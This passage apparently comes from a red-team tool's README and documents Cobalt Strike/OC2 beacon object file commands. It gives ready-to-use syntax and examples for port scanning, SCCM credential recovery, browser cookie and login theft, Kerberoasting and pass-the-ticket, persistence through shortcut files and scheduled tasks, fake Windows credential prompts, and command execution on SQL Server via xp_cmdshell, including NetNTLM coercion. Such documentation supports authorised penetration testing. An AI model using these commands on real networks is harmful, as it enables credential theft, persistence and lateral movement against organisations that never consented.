| `dns server ip` | No | IPv4 address of the DNS server to query. Defaults to the system resolver. |

### Hostnames File Format
One hostname per line. Only the first word of each line is used.

### Output
One line per host that resolves, as `hostname<TAB>ip[,ip...]`. Hosts that do not resolve are counted in the summary line, not printed. A query with no answer after 5 seconds is cancelled and counted as timed out.

### Examples
```bash
# OC2: run command, then upload hostnames file via GUI
nslookup-file
nslookup-file 10.0.0.10

# CNA
nslookup-file /tmp/computers.txt
```

---

## portscan

TCP connect scan of a single host. Up to 128 connections in flight, closed with RST. This is not a SYN scan: open ports see a full handshake.

### Syntax
```
portscan <host> <ports> [timeout ms]
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
| `host` | Yes | Hostname or IP to scan |
| `ports` | Yes | Comma-separated ports, ranges allowed (`445`, `80,443`, `1-1024,8000-8100`) |
| `timeout ms` | No | Connect timeout in milliseconds. Default 1000. |

### Output
One line per open port, as `host:port`, then a summary line with open, closed (RST), filtered (no answer before timeout), and failed counts.

### Examples
```bash
portscan DC01 445,3389
portscan 10.0.0.5 1-1024 500
```

### CNA (Cobalt Strike)
The CNA script auto-detects mode: if the first argument is an existing file path, it reads hosts from the file; otherwise it treats it as a single host.
```bash
portscan DC01 445
portscan /tmp/resolved.txt 445
```

---

## portscan-file

TCP connect scan of every host in an uploaded hosts file (OC2). Same scanner as [portscan](#portscan).

### Syntax
```
portscan-file <ports> [timeout ms]
```
Upload a newline-separated hosts file via the OC2 GUI file dialog.

### Hosts File Format
Each line can be a hostname, an IP, or `nslookup-file` output (`hostname<TAB>ip[,ip...]`). When a line has an IP, the first IP is used and the hostname is not resolved again.

### Output
Same as [portscan](#portscan).

### Examples
```bash
# OC2: run command, then upload hosts file via GUI
portscan-file 445
portscan-file 80,443 500
```

### Host discovery pipeline
```bash
# 1. Export computer dNSHostName values from AD to computers.txt
# 2. Resolve them; save the output as resolved.txt
nslookup-file                 # upload computers.txt
# 3. Scan SMB; save the output, strip ":445", save as smb.txt
portscan-file 445             # upload resolved.txt
# 4. Enumerate shares
enumshares-file               # upload smb.txt
```

---

## removeuser-domaingroup

Remove a domain user from a domain **global or universal** group via `NetGroupDelUser`. The target must be a domain controller for the user's domain. For domain-local groups, use `removeuser-localgroup --computer \\<dc>` instead.

### Syntax
```
removeuser-domaingroup <groupname> <username> [--computer <computername>]
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
| `groupname` | Yes | Domain group name (e.g., 'Domain Admins') |
| `username` | Yes | User to remove (SAM account name, e.g., 'jsmith'). `DOMAIN\user` and `user@domain` forms are auto-stripped by the OC2 wrapper. |
| `--computer` | No | DC name/FQDN (e.g., `\\dc01.corp.local`). Omit only when running on the DC itself. |

### Examples
```bash
# Remove user from a global/universal group on the DC
removeuser-domaingroup 'Domain Admins' jsmith --computer \\dc01.corp.local

# DOMAIN\ prefix is auto-stripped
removeuser-domaingroup 'GG-Sysadmins' CORP\alice --computer \\dc01.corp.local
```

---

## removeuser-localgroup

Remove a user (local or domain) from a local group on a Windows computer. When `--computer` points at a domain controller, this operates on domain-local groups in AD.

### Syntax
```
removeuser-localgroup <groupname> <username> [--computer <computername>]
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
| `groupname` | Yes | Local or domain-local group name (e.g., 'Administrators', 'Domain Admins') |
| `username` | Yes | User to remove - can be local (e.g., 'john') or domain (e.g., 'DOMAIN\john') |
| `--computer` | No | Target computer name (default: local computer). Point at a DC to operate on a domain-local group. |

### Examples
```bash
# Remove local user from Administrators group
removeuser-localgroup Administrators john

# Remove domain user from local group
removeuser-localgroup Administrators DOMAIN\john

# Remove user on remote computer
removeuser-localgroup 'Remote Desktop Users' john --computer \\COMPUTER01

# Remove domain user from a domain-local group on the DC
removeuser-localgroup 'Domain Admins' CORP\alice --computer \\dc01.corp.local
```

---

## sccm-wmi

Recover SCCM Network Access Account (NAA) credentials from the **live** client policy (CRED-3). Queries `CCM_NetworkAccessAccount` under `ROOT\ccm\policy\Machine\ActualConfig` and decrypts the `NetworkAccessUsername` / `NetworkAccessPassword` `PolicySecret` blobs locally with `CryptUnprotectData`, impersonating `SYSTEM`.

### Syntax
```
sccm-wmi
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
| (none) | No | No arguments. Live WMI triage of the local SCCM policy. |

### Examples
```bash
# Recover the NAA username and password from the live SCCM client policy
sccm-wmi
```

### Notes
- Requires a high-integrity (admin) context.
- Runs local `CryptUnprotectData` as `SYSTEM` after token impersonation.
- Requires an active SCCM client with a live policy namespace.
- For on-disk `OBJECTS.DATA` recovery (CRED-4), use `sccm-disk`. For local file/cache/log/registry enumeration (RECON-7), use `sccm-local-recon`.

---

## sccm-disk

Recover SCCM Network Access Account (NAA) credentials from the **on-disk** CIM repository (CRED-4). Parses `OBJECTS.DATA` for `CCM_NetworkAccessAccount` and decrypts the `NetworkAccessUsername` / `NetworkAccessPassword` `PolicySecret` blobs locally with `CryptUnprotectData`, impersonating `SYSTEM`.

### Syntax
```
sccm-disk [PATH]
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
| `PATH` | No | Optional `OBJECTS.DATA` path (default: `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`) |

### Examples
```bash
# Use the default OBJECTS.DATA location
sccm-disk

# Parse a specific OBJECTS.DATA copy
sccm-disk C:\Windows\System32\wbem\Repository\OBJECTS.DATA
```

### Notes
- NAA-only: recovers the network access account, not task sequences or collection variables.
- Requires a high-integrity (admin) context.
- Runs local `CryptUnprotectData` as `SYSTEM` after token impersonation.
- For live WMI policy recovery (CRED-3), use `sccm-wmi`. For local file/cache/log/registry enumeration (RECON-7), use `sccm-local-recon`.

---

## sccm-local-recon

Local SCCM client reconnaissance (RECON-7). Runs in the current user's context (no `SYSTEM` impersonation) and enumerates the SCCM local paths (`CCM\Logs`, `ccmcache`, `ccmsetup`) with per-user access, lists the `ccmcache` tree with permissions and sizes, reads the `ManagementPoints` registry value, and scrapes the CCM logs for candidate UNC paths and URLs.

### Syntax
```
sccm-local-recon
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
| (none) | No | No arguments. |

### Examples
```bash
# Enumerate the local SCCM client
sccm-local-recon
```

### Notes
- Read-only: file enumeration, registry read, and log scanning only.
- Runs in the current user's context (no `SYSTEM`, no DPAPI).
- Log scanning reads files up to 8 MiB each from `C:\Windows\CCM\Logs`.
- For credential recovery use `sccm-wmi` (CRED-3) or `sccm-disk` (CRED-4).

---

# External BOF Scripts

> **Note:** These OC2 scripts are for BOFs from external projects. The BOF binaries are **not included** in this repository. You must obtain them from the original sources.

---

## adduser

> Source: [trustedsec/CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)

Add a new user to a local or remote machine.

### Syntax
```
adduser <username> <password> [server]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `username` | Yes | - | The name of the new user (max 20 chars) |
| `password` | Yes | - | The password for the new user |
| `server` | No | local | Target machine (FQDN or IP) |

### Examples
```bash
adduser testuser Password123!
adduser testuser Password123! DC01.corp.local
adduser testuser Password123! 192.168.1.10
```

---

## cookie-monster

> Source: [mangopdf/cookie-monster-bof](https://github.com/mangopdf/cookie-monster-bof)

Locate and copy browser cookie/credential files from Chrome, Edge, or Firefox.

### Syntax
```
cookie-monster <mode> [options]
```

### Modes (mutually exclusive)
| Mode | Description |
|------|-------------|
| `--chrome` | Target Chrome browser (all processes) |
| `--edge` | Target Edge browser (all processes) |
| `--firefox` | Target Firefox (profiles.ini, key4.db, logins.json) |
| `--system <path> <pid>` | Decrypt without injection (Local State path + PID) |
| `--chromeCookiePID <pid>` | Target specific Chrome cookie process |
| `--chromeLoginDataPID <pid>` | Target specific Chrome login data process |
| `--edgeCookiePID <pid>` | Target specific Edge cookie process |
| `--edgeLoginDataPID <pid>` | Target specific Edge login data process |

### Options
| Option | Description |
|--------|-------------|
| `--key-only` | Only retrieve encryption key |
| `--cookie-only` | Only retrieve cookie file |
| `--login-data-only` | Only retrieve login data file |
| `--copy-file <path>` | Save files to disk on target |

### Examples
```bash
cookie-monster --chrome
cookie-monster --edge --key-only
cookie-monster --firefox
cookie-monster --chromeCookiePID 5678
cookie-monster --chrome --copy-file "C:\Temp"
cookie-monster --system "C:\Users\User\AppData\Local\Google\Chrome\User Data\Local State" 1234
```

---

## Kerbeus-BOF (Kerberos Operations)

> Source: [RalfHacker/Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF)

Kerberos ticket operations including TGT/TGS requests, S4U abuse, kerberoasting, and more.

### krb_asktgt
Request a TGT (Ticket Granting Ticket).
```bash
krb_asktgt /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt]
krb_asktgt /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt]
krb_asktgt /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt]
```

### krb_asktgs
Request a TGS (Service Ticket).
```bash
krb_asktgs /ticket:BASE64 /service:SPN1,SPN2 [/domain:DOMAIN] [/dc:DC] [/ptt]
```

### krb_s4u
S4U constrained delegation abuse.
```bash
krb_s4u /ticket:BASE64 /service:SPN /impersonateuser:USER [/domain:DOMAIN] [/dc:DC] [/ptt]
```

### krb_ptt
Pass the ticket (inject into session).
```bash
krb_ptt /ticket:BASE64 [/luid:LOGONID]
```

### krb_klist
List Kerberos tickets.
```bash
krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE]
```

### krb_dump
Dump Kerberos tickets (TGTs and service tickets).
```bash
krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE]
```

### krb_tgtdeleg
Retrieve TGT via GSS-API delegation abuse (no elevation needed).
```bash
krb_tgtdeleg [/target:SPN]
```

### krb_kerberoasting
Kerberoast attack.
```bash
krb_kerberoasting /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]
```

### krb_asreproasting
AS-REP roasting attack.
```bash
krb_asreproasting /user:USER [/dc:DC] [/domain:DOMAIN] [/aes]
```

### Other Kerberos Commands
- `krb_renew` - Renew a TGT
- `krb_cross_s4u` - Cross-domain S4U
- `krb_purge` - Purge tickets from session
- `krb_describe` - Parse and describe a ticket
- `krb_triage` - List tickets in table format
- `krb_hash` - Calculate Kerberos hashes
- `krb_changepw` - Change password via Kerberos

---

## LNKgenerator-BOF

> Source: [KingOfTheNOPs/LNKgenerator-BOF](https://github.com/KingOfTheNOPs/LNKgenerator-BOF)

Create a Windows shortcut (`.lnk`) file on the target. Useful for
persistence (Startup folder, user Desktop) or for staging payloads
that resolve via `IShellLinkW`.

### Syntax
```
LNKgenerator <targetFile> <targetArgs> <lnkFileLocation> <description> <curDir> <iconFile> [iShowmode] [iIconindex]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `targetFile` | Yes | — | Full path of the executable the shortcut launches |
| `targetArgs` | Yes | — | Command-line arguments. Pass `""` for none |
| `lnkFileLocation` | Yes | — | Full path where the `.lnk` will be written |
| `description` | Yes | — | Comment / description on the shortcut. Pass `""` for none |
| `curDir` | Yes | — | Working directory ("Start in"). Pass `""` for none |
| `iconFile` | Yes | — | Path to the file holding the icon resource. Pass `""` for none |
| `iShowmode` | No | `1` | `ShowWindow` `nCmdShow` value (0-11) |
| `iIconindex` | No | `0` | Zero-based icon index inside `iconFile` |

`iShowmode` accepts the documented [`ShowWindow` constants](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow):
`0` (`SW_HIDE`), `1` (`SW_NORMAL`), `2` (`SW_SHOWMINIMIZED`), `3` (`SW_MAXIMIZE`),
`7` (`SW_SHOWMINNOACTIVE`), `11` (`SW_FORCEMINIMIZE`), etc.

### Examples
```bash
# Staged Chrome shortcut with remote-debugging flags on a user's Desktop
LNKgenerator "C:\Program Files\Google\Chrome\Application\chrome.exe" \
  "--remote-debugging-port=9222 --remote-allow-origins=* --user-data-dir=C:\Users\Public\Documents" \
  "C:\Users\defaultuser\Desktop\test.lnk" \
  "Internet Access" \
  "C:\Program Files\Google\Chrome\Application" \
  "C:\Program Files\Google\Chrome\Application\chrome.exe" 1 0

# Hidden launcher with no description, no working dir, no icon
LNKgenerator "C:\Windows\System32\cmd.exe" "/c calc.exe" "C:\Users\Public\hidden.lnk" "" "" "" 0 0
```

### Notes
- All six string arguments are required; pass `""` for fields you want to leave blank
- The BOF uses `IShellLinkW` + `IPersistFile::Save`, so `lnkFileLocation` must be writable by the running token
- `iShowmode` is validated client-side against the documented `nCmdShow` values; invalid values are rejected before the BOF is sent

---

## OperatorsKit

> Source: [trustedsec/OperatorsKit](https://github.com/trustedsec/OperatorsKit)

### addtaskscheduler
Create scheduled tasks with various triggers.

```bash
# Recommended OC2 syntax
addtaskscheduler TestTask C:\Windows\System32\cmd.exe onetime --program-args "/c calc.exe" --start-time 2023-03-24T12:08:00

# Daily execution
addtaskscheduler TestTask C:\Windows\System32\cmd.exe daily --start-time 2023-03-24T12:08:00 --expire-time 2023-03-28T12:14:00 --days-interval 1 --delay PT2H

# At logon
addtaskscheduler NewTask C:\Users\Public\legit.exe logon --host DC01.local --user-id DOMAIN\Admin

# At startup
addtaskscheduler OneDrive C:\Data\OneDrive.exe startup --delay PT5M

# On lock/unlock
addtaskscheduler LockTask C:\cmd.exe lock --delay PT5M
addtaskscheduler UnlockTask C:\cmd.exe unlock --delay PT5M

# Legacy CNA-style positional syntax remains supported when it is unambiguous
addtaskscheduler TestTask "" C:\Windows\System32\cmd.exe "/c calc.exe" onetime 2023-03-24T12:08:00
```

### credprompt
Display persistent credential prompt to capture user credentials.

```bash
credprompt "Microsoft Outlook" "Connecting to user@example.com" 60
credprompt "Windows Security" "Your session has expired. Please re-enter your credentials."
credprompt "VPN Connection" "Authentication required" 120
```

### enumshares

> **Note:** `enumshares` has been moved to the main repository under `src/enumshares/`. See [enumshares](#enumshares) above.

---

## PrivKit

> Source: [mertdas/PrivKit](https://github.com/mertdas/PrivKit)

Privilege escalation enumeration. Each check is exposed as its own
OC2 command (prefixed `privkit-`); `privcheck` runs all of them in
sequence.

### Run-all
```bash
privcheck
```
Queues all ten checks below as separate non-threaded BOF tasks on the
agent. Output is appended in order as each check completes.

### Individual checks
| Command | Check |
|---------|-------|
| `privkit-alwaysinstallelevated` | `AlwaysInstallElevated` policy in HKCU/HKLM |
| `privkit-autologon` | Stored Winlogon `AutoAdminLogon` / `DefaultPassword` |
| `privkit-credmanager` | Credential Manager entries for the current token |
| `privkit-hijackablepath` | Writable directories on the system PATH |
| `privkit-modifiableautorun` | Writable Run / RunOnce autorun binaries (HKLM/HKCU, incl. Wow6432Node) |
| `privkit-modifiablesvc` | Services whose DACL grants modify rights |
| `privkit-tokenprivileges` | Privileges held by the current process token |
| `privkit-unquotedsvcpath` | Unquoted service paths containing spaces |
| `privkit-pshistory` | Presence of PSReadLine `ConsoleHost_history.txt` |
| `privkit-uacstatus` | UAC config + integrity level + local-admin membership |

### Examples
```bash
# Run every check
privcheck

# Run a single check
privkit-tokenprivileges
privkit-hijackablepath
privkit-uacstatus
```

### Notes
- None of the checks take arguments
- `privkit-credmanager` running as `SYSTEM` will not see user credentials (different logon session)
- Deployed with redteam-bofs (`oc2-python-scripts-bof/PrivKit/`); compiled `.o` files are synced from `external/PrivKit/<Check>/` by `sync-bofs.sh`

---

## SQL-BOF (SQL Server Operations)

> Source: [Tw1sm/SQL-BOF](https://github.com/Tw1sm/SQL-BOF)

SQL Server enumeration and exploitation. All commands accept optional flags: `--database`, `--linkedserver`, `--impersonate`.

### Enumeration
```bash
sql-whoami 10.10.10.50                    # Get current user/roles
sql-info 10.10.10.50                       # Server information
sql-databases 10.10.10.50                  # List databases
sql-tables 10.10.10.50 --database master   # List tables
sql-columns 10.10.10.50 Users              # List columns in table
sql-rows 10.10.10.50 Users                 # Count rows in table
sql-users 10.10.10.50                      # Enumerate DB users
sql-links 10.10.10.50                      # Enumerate linked servers
sql-impersonate 10.10.10.50                # Find impersonatable users
sql-checkrpc 10.10.10.50                   # Check RPC status
sql-agentstatus 10.10.10.50                # SQL Agent status
sql-search 10.10.10.50 password            # Search for column names
```

### Query Execution
```bash
sql-query 10.10.10.50 "SELECT @@version"
sql-query 10.10.10.50 "SELECT name FROM sys.databases" --database master
```

### Command Execution
```bash
sql-xpcmd 10.10.10.50 whoami               # Via xp_cmdshell (output returned)
sql-olecmd 10.10.10.50 whoami              # Via OLE automation (no output)
sql-agentcmd 10.10.10.50 whoami            # Via SQL Agent jobs (no output)
sql-clr 10.10.10.50 ./assembly.dll Func    # Via CLR assembly
```

### Enable/Disable Features
```bash
sql-enablexp 10.10.10.50                   # Enable xp_cmdshell
sql-disablexp 10.10.10.50
sql-enableclr 10.10.10.50                  # Enable CLR
sql-disableclr 10.10.10.50
sql-enableole 10.10.10.50                  # Enable OLE Automation
sql-disableole 10.10.10.50
sql-enablerpc 10.10.10.50 LINKED01         # Enable RPC on linked server
sql-disablerpc 10.10.10.50 LINKED01
```

### Other SQL Commands
```bash
sql-smb 10.10.10.50 \\\\10.10.10.100\\share  # Coerce NetNTLM auth
sql-adsi 10.10.10.50 ADSI_SERVER             # Get ADSI creds
sql-1434udp 10.10.10.50                      # Query SQL Browser service
```
